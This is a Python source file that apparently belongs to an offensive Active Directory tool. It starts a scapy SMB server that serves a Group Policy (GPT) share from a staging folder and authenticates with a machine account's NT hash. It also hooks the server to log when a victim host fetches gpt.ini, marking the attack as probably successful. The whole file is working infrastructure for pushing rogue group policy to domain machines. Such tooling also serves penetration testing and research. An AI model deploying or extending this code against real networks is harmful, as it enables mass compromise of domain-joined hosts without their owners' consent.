import sys
import os
import socket
import threading
from time import sleep

import typer
from helpers.utils import bcolors, logger
from helpers.cli_config import Config


def start_servers(cfg: Config, verbose: int):
    sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', 'helpers'))
    from scapy.layers.smbserver import smbserver, SMBShare, SMB_Server
    from scapy.layers.smb2 import SMB2_Create_Request
    from scapy.layers.spnego import SPNEGOSSP
    from scapy.layers.kerberos import KerberosSSP, Key, EncryptionType
    from scapy.layers.ntlm import NTLMSSP_DOMAIN
    from scapy.arch import get_if_addr

    # Monkey patch SMB update_smbheader to intercept SMB2_Create_Request
    original_update_smbheader = SMB_Server.update_smbheader
    
    def update_smbheader_hook(self, pkt):
        try:
            # Check if this packet is a file create/open request
            if SMB2_Create_Request in pkt:
                fname = pkt[SMB2_Create_Request].Name if pkt[SMB2_Create_Request].NameLen else b""
                # Name is often UTF-16LE encoded in SMB2
                if "gpt.ini" in str(fname).lower():
                    client_ip = self.sock.ins.getpeername()[0]
                    logger.warning(f"{bcolors.OKGREEN}{bcolors.BOLD}[+][SMB] {client_ip} fetched the gpt.ini file from SMB server - attack probably worked for this host{bcolors.ENDC}")
        except Exception:
            pass
            
        return original_update_smbheader(self, pkt)
    SMB_Server.update_smbheader = update_smbheader_hook

    start_smb_server = (cfg.smb_mode != "domain")
    if start_smb_server:
        smb_ssp = NTLMSSP_DOMAIN(UPN=f"{cfg.smb_machine[:-1]}@{cfg.domain}", HASHNT=bytes.fromhex(cfg.smb_nt), DC_FQDN=cfg.dc_fqdn, DC_IP=cfg.dc_ip, verb=False)
    else:
        smb_ssp = None

    smb_server_error = []

    def run_smb():
        try:
            shares = [SMBShare(name=cfg.smb_share, path=f"{cfg.clean_folder}/GPT", remark="")]
            smbserver(shares=shares, iface=cfg.smb_iface, port=445, ssp=smb_ssp, verb=verbose)
        except Exception as e:
            smb_server_error.append(e)

    if start_smb_server:
        smb_server_thread = threading.Thread(target=run_smb, daemon=True)
        smb_server_thread.start()

    smb_iface_ip = get_if_addr(cfg.smb_iface) if start_smb_server else None
    
    smb_server_ready = not start_smb_server

    for _ in range(10):
        if start_smb_server and smb_server_error:
            break
            
        if start_smb_server and not smb_server_ready and not smb_server_error:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(0.5)
                    if s.connect_ex((smb_iface_ip, 445)) == 0:
                        smb_server_ready = True
            except Exception:
                pass

        if smb_server_ready:
            logger.warning(f"{bcolors.OKGREEN}[+] SMB server started in thread{bcolors.ENDC}")
            break

        sleep(1)

    if start_smb_server and smb_server_error:
        logger.error(f"{bcolors.FAIL}[-] Failed to start SMB server: {smb_server_error[0]}{bcolors.ENDC}")
        raise typer.Exit(1)
    if start_smb_server and not smb_server_ready:
        logger.error(f"{bcolors.FAIL}[-] SMB server did not bind to port 445 in time.{bcolors.ENDC}")
        raise typer.Exit(1)
        
    
